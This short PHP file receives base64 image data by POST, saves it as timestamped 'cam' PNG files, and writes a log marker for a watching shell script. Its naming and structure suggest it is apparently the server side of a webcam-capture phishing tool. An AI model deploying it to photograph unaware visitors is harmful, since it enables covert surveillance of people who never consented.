<?php
header('Content-Type: application/json');

$date = date('dMYHis');

if (!empty($_POST['cat'])) {
    $imageData = $_POST['cat'];
    
    // Log marker for shell script detection
    file_put_contents("Log.log", "Received\r\n", FILE_APPEND);

    // Parse base64 data
    if (strpos($imageData, ',') !== false) {
        $filteredData = substr($imageData, strpos($imageData, ",") + 1);
        $unencodedData = base64_decode($filteredData);
        if ($unencodedData !== false) {
            $fp = fopen('cam' . $date . '.png', 'wb');
            if ($fp) {
                fwrite($fp, $unencodedData);
                fclose($fp);
            }
        }
    }
    echo json_encode(['status' => 'success']);
} else {
    echo json_encode(['status' => 'error', 'message' => 'No image data']);
}

exit();
?>

